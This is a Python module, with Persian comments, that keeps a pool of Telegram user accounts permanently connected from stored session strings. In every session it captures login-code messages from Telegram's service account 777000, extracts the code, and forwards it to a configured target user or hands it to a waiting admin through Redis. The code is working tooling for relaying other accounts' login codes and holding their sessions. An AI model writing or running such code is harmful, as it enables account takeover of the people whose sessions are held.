"""
core/account_manager.py
مدیریت اکانت‌های تلگرام — همیشه آنلاین + دریافت کد + auto-reconnect

دو حالت دریافت کد:
1. حالت ادمین: ادمین شماره می‌ده، ربات کد رو مستقیم به ادمین می‌فرسته
2. حالت فوروارد: کد به target یوزرنیم فوروارد می‌شه
"""

import asyncio
import logging
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    AuthKeyUnregisteredError,
    UserDeactivatedBanError,
    SessionRevokedError,
    FloodWaitError,
)

from database.mongo import MongoDB
from database.redis_client import RedisClient
from config import SESSIONS_DIR

logger = logging.getLogger("AccountManager")

RECONNECT_DELAY  = 5
MAX_RECONNECT    = 10
RECONNECT_PAUSE  = 60
LOAD_BATCH_SIZE  = 20
BATCH_DELAY      = 2

# کلیدهای Redis
def _wait_key(account_id: str) -> str:
    return f"code_wait:{account_id}"

def _result_key(account_id: str) -> str:
    return f"code_result:{account_id}"


class ManagedAccount:

    def __init__(self, doc: dict):
        self.account_id     = doc["account_id"]
        self.owner_id       = doc["owner_id"]
        self.phone          = doc.get("phone", "")
        self.tg_id          = doc.get("tg_id")
        self.session_string = doc.get("session_string", "")
        self.api_id         = doc.get("api_id")
        self.api_hash       = doc.get("api_hash", "")
        self.client: TelegramClient | None = None
        self._task: asyncio.Task | None = None
        self._running       = False
        self._reconnect_count = 0

    async def start(self) -> None:
        self._running = True
        self._task = asyncio.create_task(self._run_loop())

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
        if self.client and self.client.is_connected():
            await self.client.disconnect()

    async def _run_loop(self) -> None:
        while self._running:
            try:
                await self._connect()
                self._reconnect_count = 0
                logger.info(f"✅ Account {self.phone} connected")
                await self.client.run_until_disconnected()

            except (AuthKeyUnregisteredError, UserDeactivatedBanError, SessionRevokedError) as e:
                logger.warning(f"⛔ Account {self.phone} permanently invalid: {e}")
                from utils.channel_logger import log_error
                await log_error(f"Account {self.phone}", e, f"account_id={self.account_id}")
                await self._mark_inactive()
                break

            except FloodWaitError as e:
                logger.warning(f"⏳ Account {self.phone} flood: {e.seconds}s")
                await asyncio.sleep(e.seconds)

            except asyncio.CancelledError:
                break

            except Exception as e:
                logger.error(f"❌ Account {self.phone} error: {e}")
                from utils.channel_logger import log_error
                await log_error(f"Account {self.phone}", e, f"account_id={self.account_id}")

            if not self._running:
                break

            self._reconnect_count += 1
            if self._reconnect_count >= MAX_RECONNECT:
                logger.warning(f"⚠️ Account {self.phone} too many reconnects, pausing")
                await asyncio.sleep(RECONNECT_PAUSE)
                self._reconnect_count = 0
            else:
                await asyncio.sleep(RECONNECT_DELAY)

    async def _connect(self) -> None:
        if self.client and self.client.is_connected():
            await self.client.disconnect()

        self.client = TelegramClient(
            StringSession(self.session_string),
            self.api_id,
            self.api_hash,
            connection_retries=5,
            retry_delay=3,
            auto_reconnect=True,
        )
        await self.client.connect()

        if not await self.client.is_user_authorized():
            raise AuthKeyUnregisteredError(request=None)

        # باز کردن چت با target
        await self._ensure_chat_with_target()
        # ثبت هندلر کد
        self._register_code_handler()

    async def _ensure_chat_with_target(self) -> None:
        """
        فقط اگه قبلاً با این target چت باز نکرده،
        یه پیام می‌فرسته تا entity ذخیره بشه.
        """
        try:
            target = await MongoDB.get_forward_target()
            if not target:
                return

            # چک کن قبلاً چت باز شده یا نه
            already = await MongoDB.is_chat_opened(self.account_id, target)
            if already:
                return

            # اولین بار — پیام بفرست
            await self.client.send_message(target, ".")
            await MongoDB.mark_chat_opened(self.account_id, target)
            logger.info(f"📨 Account {self.phone}: opened chat with {target} (first time)")
        except Exception as e:
            logger.warning(f"⚠️ Account {self.phone}: chat open error: {e}")

    def _register_code_handler(self) -> None:
        """
        هر پیام از 777000:
        - اگه ادمین منتظر کده → کد رو در Redis ذخیره کن (فوروارد نزن)
        - اگه نه → فوروارد به target
        """

        @self.client.on(events.NewMessage(from_users=777000))
        async def on_telegram_code(event):
            text = event.raw_text or ""

            # استخراج کد
            code = None
            m = re.search(r'(?<!\d)(\d{5,6})(?!\d)', text)
            if m:
                code = m.group(1)

            # ── چک کن ادمین منتظر کده ───────────────────────────
            admin_id = await RedisClient._r().get(_wait_key(self.account_id))
            if admin_id:
                # ادمین منتظره — کد رو ذخیره کن، فوروارد نزن
                if code:
                    await RedisClient._r().setex(_result_key(self.account_id), 120, code)
                    logger.info(f"📩 Account {self.phone}: code {code} stored for admin {admin_id}")
                return   # ← فوروارد نمی‌زنه

            # ── حالت عادی: فوروارد به target ────────────────────
            try:
                target = await MongoDB.get_forward_target()
                if not target:
                    return
                try:
                    await self.client.send_message(target, ".")
                except Exception:
                    pass
                await asyncio.sleep(0.5)
                entity = await self.client.get_entity(target)
                await self.client.forward_messages(entity=entity, messages=event.message)
                logger.info(f"📩 Account {self.phone}: code forwarded to {target}")
                await MongoDB.log_action(self.tg_id or 0, "code_forwarded",
                                         f"account={self.account_id}")
            except Exception as e:
                logger.error(f"❌ Forward error for {self.phone}: {e}")

    async def _mark_inactive(self) -> None:
        try:
            await MongoDB.update_account_status(self.account_id, False)
        except Exception:
            pass

    # ── دریافت کد توسط ادمین ────────────────────────────────────
    async def request_code_for_admin(self, admin_id: int, timeout: int = 120) -> str | None:
        """
        ادمین شماره می‌ده:
        1. فوروارد موقتاً متوقف می‌شه (wait key در Redis)
        2. ادمین خودش کد رو از گوشیش می‌گیره
        3. کد از 777000 به سشن می‌رسه
        4. هندلر کد رو در Redis ذخیره می‌کنه
        5. اینجا polling می‌کنیم تا کد بیاد
        """
        # ثبت انتظار — فوروارد متوقف می‌شه
        await RedisClient._r().setex(_wait_key(self.account_id), timeout + 10, str(admin_id))
        logger.info(f"⏸ Account {self.phone}: forward paused, waiting for code (admin={admin_id})")

        # polling برای کد
        for _ in range(timeout):
            code = await RedisClient._r().get(_result_key(self.account_id))
            if code:
                await RedisClient._r().delete(_result_key(self.account_id))
                await RedisClient._r().delete(_wait_key(self.account_id))
                logger.info(f"✅ Account {self.phone}: code received")
                return code
            await asyncio.sleep(1)

        # timeout — فوروارد دوباره فعال می‌شه
        await RedisClient._r().delete(_wait_key(self.account_id))
        logger.info(f"⏱ Account {self.phone}: code wait timeout, forward resumed")
        return None


class AccountManager:
    _instance: "AccountManager | None" = None

    def __init__(self):
        self._accounts: dict[str, ManagedAccount] = {}

    @classmethod
    def get_instance(cls) -> "AccountManager":
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def get_account(self, account_id: str) -> ManagedAccount | None:
        return self._accounts.get(account_id)

    def get_account_by_phone(self, phone: str) -> ManagedAccount | None:
        for m in self._accounts.values():
            if m.phone == phone:
                return m
        return None

    async def load_all(self) -> None:
        accounts = await MongoDB.get_all_accounts_with_session()
        total    = len(accounts)
        logger.info(f"📦 Loading {total} accounts...")
        if total == 0:
            logger.info("✅ 0 accounts loaded")
            return
        for i in range(0, total, LOAD_BATCH_SIZE):
            batch = accounts[i:i + LOAD_BATCH_SIZE]
            tasks = [self._start_account(acc) for acc in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            if i + LOAD_BATCH_SIZE < total:
                await asyncio.sleep(BATCH_DELAY)
        await asyncio.sleep(3)
        logger.info(f"✅ {len(self._accounts)} accounts loaded | {self.connected_count()} connected")

    async def _start_account(self, doc: dict) -> None:
        acc_id = doc["account_id"]
        if acc_id in self._accounts:
            return
        if not doc.get("session_string") or not doc.get("api_id"):
            logger.warning(f"⚠️ Account {acc_id} missing session/api_id, skipping")
            return
        managed = ManagedAccount(doc)
        self._accounts[acc_id] = managed
        await managed.start()

    async def add_account(self, account_id: str) -> bool:
        if account_id in self._accounts:
            return True
        doc = await MongoDB.get_account_with_session_by_id(account_id)
        if not doc:
            return False
        await self._start_account(doc)
        return account_id in self._accounts

    async def remove_account(self, account_id: str) -> None:
        managed = self._accounts.pop(account_id, None)
        if managed:
            await managed.stop()

    def count(self) -> int:
        return len(self._accounts)

    def connected_count(self) -> int:
        return sum(1 for m in self._accounts.values()
                   if m.client and m.client.is_connected())

    def get_status(self) -> list[dict]:
        return [{"account_id": acc_id, "phone": m.phone,
                 "connected": bool(m.client and m.client.is_connected())}
                for acc_id, m in self._accounts.items()]

    async def stop_all(self) -> None:
        tasks = [m.stop() for m in self._accounts.values()]
        await asyncio.gather(*tasks, return_exceptions=True)
        self._accounts.clear()
        logger.info("🔌 All accounts disconnected")
